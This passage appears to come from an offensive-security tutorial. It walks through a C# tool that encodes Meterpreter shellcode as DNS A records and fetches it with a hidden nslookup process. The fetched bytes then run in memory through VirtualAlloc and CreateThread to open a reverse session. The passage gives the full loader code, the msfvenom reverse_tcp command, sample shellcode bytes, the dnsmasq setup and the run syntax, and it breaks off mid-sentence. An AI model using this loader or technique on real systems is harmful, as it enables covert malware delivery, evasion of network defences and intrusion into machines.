Line 101 up to 120 I will make IPv4 Address with Three octets “W.X.Y” \n\r\n\rline101:  by this code string[] XX = new string[X.Length / 3]; i want to make new Array for our Payload for each Ipv4 Address which has 3 Octets so by this Variable i want to make \"W.X.Y\" only and \"Z\" will be our Counter for Ipv4 Addresses so for creating \"Z\" Counter you need some New code i will explain them in next Pictures also in this code you can use this variable \"X_Counter\" for \"Z\" too but in my code i did not use that .\n\r\n\r  for (int i = 0; i &lt; X.Length;)\n\r\n\r            {\n\r\n\r                tmp += X[i]+\",\";\n\r\n\r                i++;\n\r\n\r                counter++;\n\r\n\r                if (counter &gt;= 3)\n\r\n\r                {\n\r\n\r                    counter = 0;\n\r\n\r                    XX[X_counter] = tmp.Substring(0,tmp.Length-1);\n\r\n\r                    X_counter++;\n\r\n\r                    tmp = \"\";\n\r\n\r                }\n\r\n\r            }\n\r\n\rby this code i will create \"W.X.Y\" :\n\r\n\r \n\r\n\rXX[0] = \"fc,48,83\"\n\r\n\rXX[1] = \"e4,f0,e8\"\n\r\n\r \n\r\n\rso our Ipv4 Address for XX[0] and XX[1] should be something like these :\n\r\n\rXX[0] = \"fc,48,83\"   == imagine this Ipv4 ==&gt;    FC.48.83.Z[0]  \n\r\n\rXX[1] = \"e4,f0,e8\"   == imagine this Ipv4 ==&gt;    E4.F0.E8.Z[1]\n\r\n\r Picture 1: Code 1 \n\r\n\rso Z is counter for your Ipv4 addresses also with this Counter you can Figure out which one of these Ipv4 address are payload[0] payload[1] payload[2] .... for handling DNS Round Robin you need this Counter 100%.\n\r\n\rif you have a payload with 510 Bytes then you will have 510 / 3  = 170 Injected Payloads by Ipv4 Address so your Z will be 0 up to 169 or 1 up to 170 .\n\r\n\r \n\r\n\rImportant Point : your Payload should Divided by 3 ! so if your payload was 511 bytes then you will have Problem (bug) then in your code you should fix this by your Own code for example one solution is making 513 bytes then you will have 171 Ipv4 then by your code you can Remove \"X . Y . Z\"  from last Ipv4 address octets X Y Z and only dump \"W\" for last Ipv4 address with Z=171\n\r\n\r \n\r\n\rExample : this is our payload bytes : \"11,22,33,44,55,66,77,88\"\n\r\n\rso this payload length is 8 bytes so 8 / 3 = 2.6 \n\r\n\rfor fix this problem you can make your Address like this 8 bytes + \"00\" = 9 bytes / 3 = 3 \n\r\n\r \n\r\n\rBytes to Int32 , Problem:\n\r\n\r\"11         ,22          ,33           ,44         ,55           ,66            ,77            ,88\"             \n\r\n\r11 = 17 , 22 = 34 , 33 = 51 , 44 = 68 , 55 = 85 , 66 = 102 , 77 = 119  , 88 = 136\n\r\n\r11.22.33.0   == imagine this Ipv4 ==&gt;   17.34.51.0\n\r\n\r44.55.66.1   == imagine this Ipv4 ==&gt;   68.85.102.1\n\r\n\r77.88.X.2   == imagine this Ipv4 ==&gt;   119.136.null.2\n\r\n\r \n\r\n\rBytes to Int32 , Fixing Problem :\n\r\n\r\"11         ,22          ,33           ,44         ,55           ,66            ,77            ,88\"          +  \"00\"\n\r\n\r11 = 17 , 22 = 34 , 33 = 51 , 44 = 68 , 55 = 85 , 66 = 102 , 77 = 119  , 88 = 136    , 00=0\n\r\n\r \n\r\n\r11.22.33.0   == imagine this Ipv4 ==&gt;   17.34.51.0\n\r\n\r44.55.66.1   == imagine this Ipv4 ==&gt;   68.85.102.1\n\r\n\r77.88.00.2   == imagine this Ipv4 ==&gt;   119.136.0.2\n\r\n\r \n\r\n\rHost                                    Record-Type                             value\n\r\n\rd.com                                    A                                        17.34.51.0\n\r\n\rd.com                                    A                                        68.85.102.1\n\r\n\rd.com                                    A                                        119.136.0.2\n\r\n\r \n\r\n\rNote : in this “Picture 2” I used “FF” but you should use “00” for Fixing Problem more often. \n\r\n\rPicture 2: in this picture I used “FF” but you should use “00”\n\r\n\r \n\r\n\rNote : in my C# Code \"Z\" always will start by 1 not by 0 so my Ipv4 Address always will start by 1 up to 255.\n\r\n\ras i said XX array is our Ipv4 Address with \"W.X.Y\" so now you should create Z for these Ipv4 Address so in next picture and Next Codes you can see how can do this very simple also you will see how can Convert Bytes (or Strings) to Int32 Ipv4 Address.\n\r\n\rBefore talking about next Picture this is our code for create IPv4 Address so let me talk about this code first. \n\r\n\rstring[] IP_Octets = new string[3];\n\r\n\r            string nique = \"\";\n\r\n\r            string Final_DNS_Text_File = \"\";\n\r\n\r            int Display_counter = 0;\n\r\n\r            int First_Octet = 0;\n\r\n\r            foreach (var item in XX)\n\r\n\r            {\n\r\n\r                /// First_Octet++; it means my counter for IPAddress will start by address W.X.Y.1 ...\n\r\n\r                First_Octet++;\n\r\n\r                IP_Octets = item.Split(\',\');\n\r\n\r                if (Display_counter &lt; 4)\n\r\n\r                    Console.Write(item.ToString() + \" ====&gt;  \");\n\r\n\r                foreach (string itemS in IP_Octets)\n\r\n\r                {                    \n\r\n\r                    int Tech = Int32.Parse(itemS, System.Globalization.NumberStyles.HexNumber);\n\r\n\r                    nique += (Tech.ToString() + \".\");\n\r\n\r                }\n\r\n\r                if (Display_counter &lt; 4)\n\r\n\r                    Console.WriteLine(nique.Substring(0, nique.Length - 1) + \".\" + (First_Octet + Int32.Parse(MainIP)).ToString());\n\r\n\r                Final_DNS_Text_File += nique.Substring(0, nique.Length - 1) + \".\" + (First_Octet + Int32.Parse(MainIP)).ToString() + \" \" + String_DomainName + \" \\r\\n\";\n\r\n\r                nique = \"\";\n\r\n\r                Display_counter++;\n\r\n\r            }\n\r\n\rCode:2\n\r\n\ras you can see by this code we want to Convert Bytes (in this case Strings) values to Int32 value so why ?\n\r\n\rBecause our Octets in IPv4 should have Int32 type from 0 up to 255 so very simple we can Convert these IPv4 address “W.X.Y” from string values to Int32 by this Code and especially these lines:\n\r\n\r foreach (string itemS in IP_Octets)\n\r\n\r                {                    \n\r\n\r                    int Tech = Int32.Parse(itemS, System.Globalization.NumberStyles.HexNumber);\n\r\n\r                    nique += (Tech.ToString() + \".\");\n\r\n\r                }\n\r\n\rnow we have these octets “W.X.Y” by converting from int32 to string by “nique” Variable without octet “Z” so by this line you can create this “Z” very simple .\n\r\n\r(First_Octet + Int32.Parse(MainIP)).ToString()\n\r\n\r \n\r\n\ras you can see in Next Picture or “Code2” we have  int First_Octet = 0;  this is our Counter for “Z” and only by using “ToString()” MainIP + First_Octet we will have “Z” value .\n\r\n\rNote: string variable “MainIP” = “0” in my Code so it means my Counter Will Start by 0 + First_Octet and First_Octet always will start from 1 , Why ? Because you can see this Variable in “Line 128” has “++”\n\r\n\r \n\r\n\r\n\r\n\r      foreach (var item in XX)\n\r\n\r            {\n\r\n\r                /// First_Octet++; it means my counter for IPAddress will start by address W.X.Y.1 ...\n\r\n\r                First_Octet++;\n\r\n\r                IP_Octets = item.Split(\',\');\n\r\n\r \n\r\n\ras you can see in “Picture 3” with string variable  Final_DNS_Text_File  we can have this Result for DNS A Records like these three Records for using in Dns Server in this case Dnsmasq tool via linux :\n\r\n\r Final_DNS_Text_File += nique.Substring(0, nique.Length - 1) + \".\" + (First_Octet + Int32.Parse(MainIP)).ToString() + \" \" + String_DomainName + \" \\r\\n\";\n\r\n\r \n\r\n\r \n\r\n\r252.72.131.1 Microsoft.com\n\r\n\r228.240.232.2 Microsoft.com\n\r\n\r204.0.0.3 Microsoft.com\n\r\n\r.\n\r\n\r.\n\r\n\r.\n\r\n\r Picture 3: \n\r\n\rNow you can compare this “DNS Zone 2” with “DNS Zone 1” and I think with this example and Codes you will understand what exactly happened with this Technique.\n\r\n\rHost                                    Record-Type                             value\n\r\n\rMicrosoft.com                        A                                           252.72.131.1\n\r\n\rMicrosoft.com                        A                                           228.240.232.2\n\r\n\rMicrosoft.com                        A                                           204.0.0.3\n\r\n\rMicrosoft.com                        A                                           0.65.81.4\n\r\n\r \n\r\n\rDNS Zone 2 : ready to use by Attacker:\n\r\n\ras you can see in DNS Zone 2 these A Records are Valid for DNS Server with Dnsmasq tool now these A records are ready for using by Backdoor. So in this technique backdoor will dump these A records by Single Command execution like this but first you need save these records to “/etc/hosts” File on linux for Dnsmasq tool then you can use this Command in Windows Side:\n\r\n\rc:\\&gt; nslookup Microsoft.com 192.168.56.1 \n\r\n\rPicture 4: Nslookup\n\r\n\ras you can see with Nslookup command your Injected payloads to A Records very simple Dumped to this Console now an attacker need to Convert these Int32 IPv4 address “W.X.Y” to “Bytes” and Finally “BINGO” you will have Meterpreter Session .\n\r\n\rSo now we should talk about how can use Nslookup like “Picture 4” by C# to Dump These Payloads via DNS Traffic (A Records).\n\r\n\rSo I made this code for using Nslookup to Dump A records also converting them to Bytes for Executing in Memory.\n\r\n\r public static byte[] __nslookup(string DNS_PTR_A, string DnsServer)\n\r\n\r        {\n\r\n\r            /// Make DNS traffic for getting Meterpreter Payloads by nslookup\n\r\n\r            ProcessStartInfo ns_Prcs_info = new ProcessStartInfo(\"nslookup.exe\", DNS_PTR_A + \" \" + DnsServer);\n\r\n\r            ns_Prcs_info.RedirectStandardInput = true;\n\r\n\r            ns_Prcs_info.RedirectStandardOutput = true;\n\r\n\r            ns_Prcs_info.UseShellExecute = false;\n\r\n\r            /// you can use Thread Sleep here \n\r\n\r \n\r\n\r            Process nslookup = new Process();\n\r\n\r            nslookup.StartInfo = ns_Prcs_info;\n\r\n\r            nslookup.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;\n\r\n\r            nslookup.Start();\n\r\n\r \n\r\n\r       \n\r\n\r            string computerList = nslookup.StandardOutput.ReadToEnd();\n\r\n\r            string[] lines = computerList.Split(\'\\r\', \'n\');\n\r\n\r            int ID = 0;\n\r\n\r            foreach (var item in lines)\n\r\n\r            {\n\r\n\r                if (item.Contains(DNS_PTR_A))\n\r\n\r                {\n\r\n\r                    break;\n\r\n\r                }\n\r\n\r                ID++;\n\r\n\r            }\n\r\n\r            int FindID_FirstAddress = ID + 1;\n\r\n\r            string last_line = lines[lines.Length - 3];\n\r\n\r            List&lt;string&gt; A_Records = new List&lt;string&gt;();\n\r\n\r            A_Records.Add(lines[FindID_FirstAddress].Split(\':\')[1].Substring(2));\n\r\n\r            for (int iq = FindID_FirstAddress + 1; iq &lt; lines.Length - 2; iq++)\n\r\n\r            {\n\r\n\r                A_Records.Add(lines[iq].Substring(4));\n\r\n\r \n\r\n\r            }\n\r\n\r            /// Debug\n\r\n\r            Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r            Console.WriteLine();\n\r\n\r            Console.ForegroundColor = ConsoleColor.DarkGreen;\n\r\n\r            Console.WriteLine(\"[!] Debug Mode [ON]\");\n\r\n\r            Console.ForegroundColor = ConsoleColor.DarkGreen;\n\r\n\r            Console.WriteLine(\"[!] DNS Server Address: {0}\", DnsServer);\n\r\n\r            Console.ForegroundColor = ConsoleColor.Green;\n\r\n\r            Console.WriteLine(\"[&gt;] Downloading Meterpreter Payloads or Text Data by ({1}) DNS A Records for Domain Name : {0}\",DNS_PTR_A,A_Records.Count.ToString());\n\r\n\r            Console.WriteLine();\n\r\n\r            Console.ForegroundColor = ConsoleColor.DarkYellow;\n\r\n\r            foreach (var item3 in A_Records)\n\r\n\r            {\n\r\n\r                Console.Write(\"[{0}] , \",item3.ToString());                \n\r\n\r            }\n\r\n\r            Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r            Console.WriteLine();\n\r\n\r \n\r\n\r            int serial = 0;\n\r\n\r            string[] obj = new string[4];\n\r\n\r \n\r\n\r            /// X.X.X * Y = Payload length; so A_Records * 3 is your Payload Length ;)\n\r\n\r            byte[] XxXPayload = new byte[A_Records.Count * 3];\n\r\n\r \n\r\n\r            Int32 Xnumber = 0;\n\r\n\r \n\r\n\r            for (int Onaggi = 1; Onaggi &lt;= A_Records.Count; Onaggi++)\n\r\n\r            {\n\r\n\r \n\r\n\r                foreach (var item in A_Records)\n\r\n\r                {\n\r\n\r                    obj = item.Split(\'.\');\n\r\n\r                    serial = Convert.ToInt32(item.Split(\'.\')[3]);\n\r\n\r                    if (serial == Onaggi)\n\r\n\r                    {\n\r\n\r                        XxXPayload[Xnumber] = Convert.ToByte(obj[0]);\n\r\n\r                        XxXPayload[Xnumber + 1] = Convert.ToByte(obj[1]);\n\r\n\r                        XxXPayload[Xnumber + 2] = Convert.ToByte(obj[2]);\n\r\n\r \n\r\n\r                        Xnumber++;\n\r\n\r                        Xnumber++;\n\r\n\r                        Xnumber++;\n\r\n\r \n\r\n\r                        break;\n\r\n\r                    }\n\r\n\r                }\n\r\n\r            }\n\r\n\r           \n\r\n\r            return XxXPayload;\n\r\n\r \n\r\n\r        }\n\r\n\rCode : 3\n\r\n\rnow let me explain this “code 3” at least Important Lines by three Sections (Code 3-1 , Code 3-2 and Code 3-3).\n\r\n\r  /// Make DNS traffic for getting Meterpreter Payloads by nslookup\n\r\n\r            ProcessStartInfo ns_Prcs_info = new ProcessStartInfo(\"nslookup.exe\", DNS_PTR_A + \" \" + DnsServer);\n\r\n\r            ns_Prcs_info.RedirectStandardInput = true;\n\r\n\r            ns_Prcs_info.RedirectStandardOutput = true;\n\r\n\r            ns_Prcs_info.UseShellExecute = false;\n\r\n\r            /// you can use Thread Sleep here \n\r\n\r \n\r\n\r            Process nslookup = new Process();\n\r\n\r            nslookup.StartInfo = ns_Prcs_info;\n\r\n\r            nslookup.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;\n\r\n\r            nslookup.Start();\n\r\n\rCode 3-1:\n\r\n\rwith this code 3-1 we can have Result for Nslookup exactly like “Picture 4”. so as you can see in “Picture 4”  after Executing Nslookup we have This Result :\n\r\n\rc:\\&gt; nslookup Microsoft.com 192.168.56.1\n\r\n\rServer: unknown\n\r\n\rAddress: 192.168.56.1\n\r\n\r \n\r\n\rName: Microsoft.com\n\r\n\rAddresses:  240.181.162.169\n\r\n\r                    73.199.194.168\n\r\n\r \n\r\n\rnow I will show you how can Get these Nslookup output by C# also Converting them to Bytes.\n\r\n\rFirst of all we need to download these IPv4 Addresses one by one , because we have 170 IPv4 Addresses so you can See these IPv4 Addresses in “Picture 4”. \n\r\n\r \n\r\n\rNote : I will show you how can make these IPv4 Addresses by Msfvenom Payloads and This Tool but in this time we talking about C# Code so in Next Part of this Chapter I will Demo this Tool step by step , Don\'t worry.\n\r\n\r \n\r\n\rNow we need to little bit Code to dump these IPv4 Addresses so first I will Dump all output Lines for Nslookup to one String Variable with name  string computerList = nslookup.StandardOutput.ReadToEnd(); , then by this Code string[] lines = computerList.Split(\'\\r\', \'n\');  Very simple I will make Array for each line of this output which each one has some information like IPv4 Addresses too so in variable “lines” we will have something like this :\n\r\n\rServer: unknown                ===== &gt; lines[0]\n\r\n\rAddress: 192.168.56.1                ===== &gt; lines[1]\n\r\n\r                                                    ===== &gt; lines[2]\n\r\n\rName: Microsoft.com                 ===== &gt; lines[3]\n\r\n\rAddresses:  240.181.162.169                 ===== &gt; lines[4]\n\r\n\r                    73.199.194.168                ===== &gt; lines[5]\n\r\n\r \n\r\n\rnow I know variable Lines[0] and Lines[1] and Lines[2] are not Important for me But Lines[3] is Important for this Code .so how can detect this Line very simple you can Find that by this code :\n\r\n\r int ID = 0;\n\r\n\r            foreach (var item in lines)\n\r\n\r            {\n\r\n\r                if (item.Contains(DNS_PTR_A))\n\r\n\r                {\n\r\n\r                    break;\n\r\n\r                }\n\r\n\r                ID++;\n\r\n\r            }\n\r\n\r            int FindID_FirstAddress = ID + 1;\n\r\n\r \n\r\n\rwith this code I can find Line Number for “Microsoft.com” which is line[3] in this case our variable DNS_PTR_A = “Microsoft.com”.\n\r\n\rNow I get this ID = 3 and ID + 1 = “My First IPAddress Line Number”\n\r\n\rso First IPAddress Line Number is 3 + 1 = 4 .\n\r\n\ras you can see lines[4] == “Addresses:  240.181.162.169“\n\r\n\rnow we need to dump this IPv4 Address from this line only so we should Remove this string “Addresses:  “ from lines[4] so how can do this ?\n\r\n\r string last_line = lines[lines.Length - 3];\n\r\n\r            List&lt;string&gt; A_Records = new List&lt;string&gt;();\n\r\n\r            A_Records.Add(lines[FindID_FirstAddress].Split(\':\')[1].Substring(2));\n\r\n\r            for (int iq = FindID_FirstAddress + 1; iq &lt; lines.Length - 2; iq++)\n\r\n\r            {\n\r\n\r                A_Records.Add(lines[iq].Substring(4));\n\r\n\r            }\n\r\n\r \n\r\n\rbefore dumping First IPv4 Address we need one List for our IPv4 Addresses so you can create that by this code: \n\r\n\r \n\r\n\rList&lt;string&gt; A_Records = new List&lt;string&gt;(); \n\r\n\r \n\r\n\rNow with this code you can dump this first IPv4 Address from lines[4] :\n\r\n\r \n\r\n\rA_Records.Add(lines[FindID_FirstAddress].Split(\':\')[1].Substring(2));\n\r\n\r \n\r\n\ras you can see in “Picture 4” we have only IPv4 Addresses in next lines so you can Dump them by this Code :  \n\r\n\r for (int iq = FindID_FirstAddress + 1; iq &lt; lines.Length - 2; iq++)\n\r\n\r            {\n\r\n\r                A_Records.Add(lines[iq].Substring(4));\n\r\n\r            }\n\r\n\r \n\r\n\rso this is our “code 3-2” for Section (Dumping IPv4 Addresses by “Nslookup” command):\n\r\n\r string computerList = nslookup.StandardOutput.ReadToEnd();\n\r\n\r            string[] lines = computerList.Split(\'\\r\', \'n\');\n\r\n\r            int ID = 0;\n\r\n\r            foreach (var item in lines)\n\r\n\r            {\n\r\n\r                if (item.Contains(DNS_PTR_A))\n\r\n\r                {\n\r\n\r                    break;\n\r\n\r                }\n\r\n\r                ID++;\n\r\n\r            }\n\r\n\r            int FindID_FirstAddress = ID + 1;\n\r\n\r            string last_line = lines[lines.Length - 3];\n\r\n\r            List&lt;string&gt; A_Records = new List&lt;string&gt;();\n\r\n\r            A_Records.Add(lines[FindID_FirstAddress].Split(\':\')[1].Substring(2));\n\r\n\r            for (int iq = FindID_FirstAddress + 1; iq &lt; lines.Length - 2; iq++)\n\r\n\r            {\n\r\n\r                A_Records.Add(lines[iq].Substring(4));\n\r\n\r            }\n\r\n\rCode 3-2:\n\r\n\r \n\r\n\rwith previous Code we have these dumped IPv4 Addresses with String type now we need change or Convert these IPv4 Addresses from String to Bytes for Executing in Memory so this “Code 3-3” is for this Section :\n\r\n\r  /// Debug\n\r\n\r            Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r            Console.WriteLine();\n\r\n\r            Console.ForegroundColor = ConsoleColor.DarkGreen;\n\r\n\r            Console.WriteLine(\"[!] Debug Mode [ON]\");\n\r\n\r            Console.ForegroundColor = ConsoleColor.DarkGreen;\n\r\n\r            Console.WriteLine(\"[!] DNS Server Address: {0}\", DnsServer);\n\r\n\r            Console.ForegroundColor = ConsoleColor.Green;\n\r\n\r            Console.WriteLine(\"[&gt;] Downloading Meterpreter Payloads or Text Data by ({1}) DNS A Records for Domain Name : {0}\",DNS_PTR_A,A_Records.Count.ToString());\n\r\n\r            Console.WriteLine();\n\r\n\r            Console.ForegroundColor = ConsoleColor.DarkYellow;\n\r\n\r            foreach (var item3 in A_Records)\n\r\n\r            {\n\r\n\r                Console.Write(\"[{0}] , \",item3.ToString());                \n\r\n\r            }\n\r\n\r            Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r            Console.WriteLine();\n\r\n\r \n\r\n\r            int serial = 0;\n\r\n\r            string[] obj = new string[4];\n\r\n\r \n\r\n\r            /// X.X.X * Y = Payload length; so A_Records * 3 is your Payload Length ;)\n\r\n\r            byte[] XxXPayload = new byte[A_Records.Count * 3];\n\r\n\r \n\r\n\r            Int32 Xnumber = 0;\n\r\n\r \n\r\n\r            for (int Onaggi = 1; Onaggi &lt;= A_Records.Count; Onaggi++)\n\r\n\r            {\n\r\n\r \n\r\n\r                foreach (var item in A_Records)\n\r\n\r                {\n\r\n\r                    obj = item.Split(\'.\');\n\r\n\r                    serial = Convert.ToInt32(item.Split(\'.\')[3]);\n\r\n\r                    if (serial == Onaggi)\n\r\n\r                    {\n\r\n\r                        XxXPayload[Xnumber] = Convert.ToByte(obj[0]);\n\r\n\r                        XxXPayload[Xnumber + 1] = Convert.ToByte(obj[1]);\n\r\n\r                        XxXPayload[Xnumber + 2] = Convert.ToByte(obj[2]);\n\r\n\r \n\r\n\r                        Xnumber++;\n\r\n\r                        Xnumber++;\n\r\n\r                        Xnumber++;\n\r\n\r \n\r\n\r                        break;\n\r\n\r                    }\n\r\n\r                }\n\r\n\r            }\n\r\n\r           \n\r\n\r            return XxXPayload;\n\r\n\r \n\r\n\rCode 3-3:\n\r\n\rfor converting IPv4 Addresses to bytes we will have something like this :\n\r\n\rW.X.Y.Z  ====&gt;  Converting to Bytes by these octets ( W ,  X ,  Y )\n\r\n\rand Z is our Counter for Payloads only\n\r\n\rso if our IPv4 Addresses was for example :\n\r\n\r240.181.162.169  === Your Payload is ==&gt;  F0.B5.A2.169\n\r\n\r73.199.194.168    === Your Payload is ==&gt;  49.C7.C2.168\n\r\n\r \n\r\n\rNow you can understand how this Converting will work so by this code I will create one Object array with 4 value for IPv4-Address and but in my code I used 3 value of this Variable only !\n\r\n\r\n\r\n\r            int serial = 0;\n\r\n\r            string[] obj = new string[4];\n\r\n\r \n\r\n\r            /// X.X.X * Y = Payload length; so A_Records * 3 is your Payload Length ;)\n\r\n\r            byte[] XxXPayload = new byte[A_Records.Count * 3];\n\r\n\r\n\r\n\rwith this code I will create Byte Variable for payload and each Value in A_Records has W.X.Y octets , it means we have 3 * all A_Records so our Payload length = A_Records.Count * 3  \n\r\n\r \n\r\n\r byte[] XxXPayload = new byte[A_Records.Count * 3];\n\r\n\r \n\r\n\rNow with this code you can convert all IPv4 Addresses from String to Byte also by this code your Payloads will sort by “Z” value or Last octet of IPv4Address in this code Serial = Z. \n\r\n\r serial = Convert.ToInt32(item.Split(\'.\')[3]);  ===&gt;  W.X.Y.{Z}\n\r\n\r \n\r\n\rso Serial = “Z” (our Counter for Payloads) and this value started from 1 up to 255 but in this case our Meterperter Payloads was \n\r\n\r510 bytes so 510 / 3 = 170 ,  it means our Z started from 1 up to 170. \n\r\n\rPayload length = A_Records.Count * 3   ====&gt;  (170 * 3) = 510 bytes\n\r\n\r \n\r\n\r Int32 Xnumber = 0;\n\r\n\r \n\r\n\r            for (int Onaggi = 1; Onaggi &lt;= A_Records.Count; Onaggi++)\n\r\n\r            {\n\r\n\r \n\r\n\r                foreach (var item in A_Records)\n\r\n\r                {\n\r\n\r                    obj = item.Split(\'.\');\n\r\n\r                    serial = Convert.ToInt32(item.Split(\'.\')[3]);\n\r\n\r                    if (serial == Onaggi)\n\r\n\r                    {\n\r\n\r                        XxXPayload[Xnumber] = Convert.ToByte(obj[0]);\n\r\n\r                        XxXPayload[Xnumber + 1] = Convert.ToByte(obj[1]);\n\r\n\r                        XxXPayload[Xnumber + 2] = Convert.ToByte(obj[2]);\n\r\n\r \n\r\n\r                        Xnumber++;\n\r\n\r                        Xnumber++;\n\r\n\r                        Xnumber++;\n\r\n\r \n\r\n\r                        break;\n\r\n\r                    }\n\r\n\r                }\n\r\n\r            }\n\r\n\r   return XxXPayload;\n\r\n\r \n\r\n\r \n\r\n\rWith this code our XxXPayload  Will have something like this :\n\r\n\r \n\r\n\r240.181.162.169  === Your XxXPayload  is ==&gt;  F0.B5.A2,........\n\r\n\r \n\r\n\rnow we should talk about Switch “SESSION” in (Main() C# Code) , in this section of code I used __nslookup() Method as explained by “Code 3” : \n\r\n\rin this section I used __nslookup(args[1], args[2]);  With Argument 1 and 2 so in Command Prompt we have something like this :\n\r\n\r \n\r\n\rc:\\&gt; NativePayload_DNS2.exe session “DomainName” “FakeDNSserver”\n\r\n\rc:\\&gt; NativePayload_DNS2.exe session  Microsoft.com   192.168.56.1\n\r\n\r \n\r\n\rNSLOOKUP Result : by __nslookup Method our Payload will dump by sending one DNS A Record Request to FakeDNSserver and Result will save to this byte[] _Exfiltration_DATA_Bytes_A_Records; variable .\n\r\n\r \n\r\n\rMeterpreter Session : Making New Thread into Current Process :\n\r\n\r \n\r\n\rwith these API Functions VirtualAlloc ,  CreateThread , WaitForSingleObject  you can have New Thread in Current Process and this Thread is our Meterperter Payload “Native Code” made by our NSLOOKUP Result “byte[] _Exfiltration_DATA_Bytes_A_Records;\" . (BINGO Meterpreter Session) \n\r\n\r \n\r\n\r  if (args[0].ToUpper() == \"SESSION\")\n\r\n\r            {\n\r\n\r \n\r\n\r                byte[] _Exfiltration_DATA_Bytes_A_Records;\n\r\n\r                _Exfiltration_DATA_Bytes_A_Records = __nslookup(args[1], args[2]);\n\r\n\r \n\r\n\r                Console.ForegroundColor = ConsoleColor.Gray;\n\r\n\r                Console.WriteLine();\n\r\n\r                Console.WriteLine(\"Bingo Meterpreter session by DNS traffic (A Records) ;)\");\n\r\n\r                UInt32 funcAddr = VirtualAlloc(0, (UInt32)_Exfiltration_DATA_Bytes_A_Records.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n\r\n\r                Marshal.Copy(_Exfiltration_DATA_Bytes_A_Records, 0, (IntPtr)(funcAddr), _Exfiltration_DATA_Bytes_A_Records.Length);\n\r\n\r                IntPtr hThread = IntPtr.Zero;\n\r\n\r                UInt32 threadId = 0;\n\r\n\r                IntPtr pinfo = IntPtr.Zero;\n\r\n\r \n\r\n\r                hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);\n\r\n\r                WaitForSingleObject(hThread, 0xFFFFFFFF);\n\r\n\r \n\r\n\r            }\n\r\n\r \n\r\n\r\n\r\n\rPicture 4-1: Bingo Meterpreter Session\n\r\n\r \n\r\n\rPART2 , Demo : (C# Code “NativePayload_DNS2” Step by step)\n\r\n\rNow in this PART2 I want to show you how can use this tool Step by step :\n\r\n\r \n\r\n\rStep1: Creating Meterpreter payload by msfvenom tool\n\r\n\r \n\r\n\rsyntax : msfvenom –arch x86_64 –platform windows -p windows/x64/meterpreter/reverse_tcp lhost=192.168.56.1 -f csharp &gt; payload.txt\n\r\n\r \n\r\n\rwith this command you will have something like this payload : \n\r\n\r \n\r\n\r0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,\n\r\n\r0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,\n\r\n\r0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,\n\r\n\r0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,....\n\r\n\r \n\r\n\rSo you should change this payload from 0xfc,0x48 ==&gt; fc,48,83,....\n\r\n\rit means you should remove all “0x” from Payload then you can use this String as Payload .\n\r\n\r \n\r\n\rStep2: Using NativePayload_DNS2.exe with Switch “Create” for creating Meterpreter Payload by DNS A Records.\n\r\n\rSo in this step you can use Switch “Help” for this tool like “Picture 5”.\n\r\n\r Picture 5: NativePayload_DNS2  Help \n\r\n\ras you can see in this help we can use Switch “Create” by this Syntax :\n\r\n\r \n\r\n\rNativePayload_DNS2.exe create “DomainName” “Meterpreter_Payload”\n\r\n\rNativePayload_DNS2.exe create google.com “fc,48,....”\n\r\n\r \n\r\n\rso I made this Payload by Domain Name Google.com like Picture 6:\n\r\n\r  \n\r\n\rPicture 6: NativePayload_DNS2.exe create “DomainName” “Meterpreter_Payload”\n\r\n\r \n\r\n\rNow you should save these A records to hosts file in Kali linux for using by dnsmasq tool and linux file address for DNS is “/etc/hosts” \n\r\n\rPicture 7: hosts file is ready.\n\r\n\r \n\r\n\r \n\r\n\rnow you can run this DNS server by this command in kali linux : \n\r\n\rsyntax : dnsmasq --no-daemon --log-queries\n\r\n\r \n\r\n\rroot@linux:~#dnsmasq --no-daemon –log-queries\n\r\n\rdnsmasq: started, version 2.72 cachesize 150\n\r\n\rdnsmasq: compile time options: IPv6 GNU-getopt DBus i18n IDN DHCP DHCPv6 no-Lua TFTP conntrack ipset auth DNSSEC loop-detect\n\r\n\rdnsmasq: no servers found in /etc/resolv.conf, will retry\n\r\n\rdnsmasq: read /etc/hosts - 172 addresses\n\r\n\r \n\r\n\ras you can see 172 Addresses read or loaded by dnsmasq tool but 170 of them are my Meterpreter Payload .\n\r\n\r \n\r\n\rStep3: Getting Meterpreter Session via DNS traffic (A records)\n\r\n\rin this step you only need to use switch “Session” so syntax is :\n\r\n\r \n\r\n\rSyntax: NativePayload_DNS2.exe SESSION DomainName FakeDNSServer\n\r\n\rSyntax: NativePayload_DNS2.exe SESSION google.com 192.168.56.1\n\r\n\r \n\r\n\rNote: Before executing this Command you should made Meterperter Listener for your backdoor payload in your Kali linux with IP 192.168.56.1 (in this case our FakeDNSserver IP address is 192.168.56.1 ). \n\r\n\rPicture 8: Meterpreter Session via DNS A records\n\r\n\r \n\r\n\rBingo : you will have meterpreter Session very simple by Sending One DNS Request .\n\r\n\r \n\r\n\rStep4: Creating Text/Payload Data by (Text or Text Files) via DNS traffic (A records)\n\r\n\r \n\r\n\rin this step I want to show how can Make Text Data and Transfer them by DNS A records so in this case we need use switch “Textfile” :\n\r\n\r \n\r\n\rSyntax 1: NativePayload_DNS2.exe Textfile DomainName “your text or string”\n\r\n\rExample 1: NativePayload_DNS2.exe Textfile  test.com   “this is test”\n\r\n\r \n\r\n\rSyntax 2: NativePayload_DNS2.exe Textfile DomainName -F [TextFileName.txt]\n\r\n\rExample 2: NativePayload_DNS2.exe Textfile  Test.com  -F  myfile.txt\n\r\n\r \n\r\n\rin this case we have some problems so I will explain them one by one \n\r\n\r \n\r\n\rExample with Error : \n\r\n\rIn this example I want to make this Text:  “this is test 0” \n\r\n\ras you can see in “Picture 9” I got Error for this text so for fixing this problem you should remove/add one or two characters to your String .\n\r\n\r \n\r\n\rwhy this Error happened ?\n\r\n\r“This is test 0” has length 14 so 14 % 3 = 2 so this should be 0 not 2 .\n\r\n\r \n\r\n\rit means : “this  